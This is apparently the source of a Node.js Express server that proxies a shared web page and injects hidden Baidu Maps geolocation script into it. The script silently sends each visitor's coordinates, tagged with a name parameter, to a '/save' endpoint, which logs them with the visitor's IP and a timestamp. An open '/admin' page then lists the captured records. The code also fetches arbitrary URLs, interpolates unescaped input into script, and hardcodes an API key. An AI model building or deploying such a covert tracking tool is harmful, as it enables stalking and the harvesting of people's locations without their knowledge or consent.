const express = require('express')
const app = express()
const jsdom = require("jsdom")
const { JSDOM } = jsdom
const request = require('request-promise')
const rq = require('request')
const fs = require('fs')
const path = require('path')
const crypto = require('crypto');
app.set('view engine', 'pug')
app.all('*', function (req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', '*');
    next();
})
app.get('/admin', function (req, res) {
    var str = fs.readFileSync('record.txt').toString()
    var record = str.split('\n').map(i => {
        return i.split(' ')
    }).filter(i => {
        return i.length === 4
    }).map(i => {
        i[3] = new Date(Number(i[3])).toLocaleString('zh')
        return i
    })
    res.render('admin', { record: record })
})
app.get('/save/', function (req, res) {
    console.log(req.query)
    var real_ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress || ''
    fs.writeFile('record.txt', `${req.query.name} ${req.query.location} ${real_ip} ${new Date().getTime()}\n`, { flag: 'a' }, err => { });
    res.send({ success: true })
})
app.get('/delRecord/', function (req, res) {
    var str = fs.readFileSync('record.txt').toString()
    var records = str.split('\n').map(i => {
        return i.split(' ')
    }).filter(i => {
        return i.length === 4
    })
    records.splice(req.query.index, 1)
    str = records.map(i => {
        return i.join(' ')
    }).join('\n');
    console.log(str)
    fs.writeFileSync('record.txt', str)
    res.send({ success: true })
})
app.get('/delAllRecord/', function (req, res) {
    fs.writeFileSync('record.txt', '')
    res.send({ success: true })
})
app.get('/getShareInfo/', async function (req, res) {
    var html
    try {
        html = await request({
            method: 'get',
            url: decodeURIComponent(req.query.url)
        })
    } catch (e) {
        res.sendStatus(404);
        return
    }
    var data = {}
    const dom = new JSDOM(html)
    var eles = dom.window.document.querySelectorAll("img")
    for (let i = 0; i < eles.length; i++) {
        var item = eles[i]
        var src = item.attributes['data-src'] || item.attributes['src']
        if (src && src.value) {
            data.src = src.value
            break
        }
    }
    eles = dom.window.document.querySelectorAll("h1,h2,h3")
    for (let i = 0; i < eles.length; i++) {
        var item = eles[i]
        console.log(item)
        if (item.innerHTML) {
            data.title = item.innerHTML.trim()
            break
        }
    }
    res.send(data)
})
app.get('/:url/', async function (req, res) {
    var html
    try {
        html = await request({
            method: 'get',
            url: req.params.url
        })
    } catch (e) {
        res.sendStatus(404);
        return
    }
    const dom = new JSDOM(html)
    var eles = dom.window.document.querySelectorAll("img")
    for (n in dom.window.document.querySelectorAll("img")) {
        var item = eles[n]
        if (item.attributes) {
            var src = item.attributes['data-src'] || item.attributes['src']
            if (src) {
                try {
                    var fileName = await saveImg(src.value)
                    item.setAttribute('src', '/files/' + fileName)
                    item.removeAttribute('data-src')
                    item.removeAttribute('data-before-oversubscription-url')
                } catch (e) {
                    console.log(e)
                }
            }
        }
    }
    var mapSDK = dom.window.document.createElement('script')
    mapSDK.setAttribute('type', 'text/javascript')
    mapSDK.setAttribute('src', 'http://api.map.baidu.com/api?v=2.0&ak=ktCm4H6RbiLV7FUeUmk2384NjPoNgYMI')
    dom.window.document.head.append(mapSDK)

    var mapDom = dom.window.document.createElement('div')
    mapDom.style.display = 'none'
    mapDom.setAttribute('id', 'allmap')
    dom.window.document.body.append(mapDom)

    var mapCode = dom.window.document.createElement('script')
    mapCode.setAttribute('type', 'text/javascript')
    mapCode.innerHTML = `var map = new BMap.Map("allmap");
    var point = new BMap.Point(116.331398,39.897445);
    map.centerAndZoom(point,12);
    
    var geolocation = new BMap.Geolocation();
    geolocation.enableSDKLocation();
    geolocation.getCurrentPosition(function(r){
        if(this.getStatus() == BMAP_STATUS_SUCCESS){
            var mk = new BMap.Marker(r.point);
            map.addOverlay(mk);
            map.panTo(r.point);
            var xhr=new XMLHttpRequest();
            xhr.open('get', '/save?location=' + r.point.lat + ',' + r.point.lng + '&name=${req.query.name}');
            xhr.send();
        }
        else {
        }        
    });`
    dom.window.document.body.append(mapCode)
    res.send(dom.serialize())
})
app.get('/files/:fileName/', function (req, res) {
    var fileName = req.params.fileName
    res.sendFile(path.resolve(__dirname, 'files', fileName))
})
app.listen(8081)

function saveImg(url) {
    var md5 = crypto.createHash('md5');
    var fileName = md5.update(url).digest('hex');
    return new Promise((resolve, reject) => {
        try {
            fs.statSync('./files/' + fileName)
            resolve(fileName)
        } catch (e) {
            var writeStream = fs.createWriteStream('./files/' + fileName)
            writeStream.on('finish', () => {
                resolve(fileName)
            })
            rq.get(url)
                .on('error', err => {
                    reject(err)
                })
                .pipe(writeStream)
        }
    })
}
